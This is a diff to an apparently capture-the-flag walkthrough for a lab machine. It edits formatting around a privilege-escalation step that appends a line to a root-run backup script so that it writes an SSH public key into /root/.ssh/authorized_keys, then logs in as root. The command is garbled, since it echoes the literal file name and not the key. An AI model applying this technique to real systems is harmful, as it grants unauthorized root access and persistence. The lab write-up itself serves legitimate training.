@@ -86,13 +86,14 @@ We can see that root has been accessing this file: “/usr/bin/timer_backup.sh�
 
 You need to create your ssh key, and you need to replace your ssh publickey to /root/.ssh/authorized_keys” >> /usr/bin/timer_backup.sh to do this follow commands :
 
-```
-#ssh-keygen
+```sh
+ssh-keygen
 ( no passphrase ) 
 Copy your id_rsa.pub key 
 and paste this command in target machine : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
+```
 
-Now : chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214
+Now : ```chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214```
 
 Done ! 
 
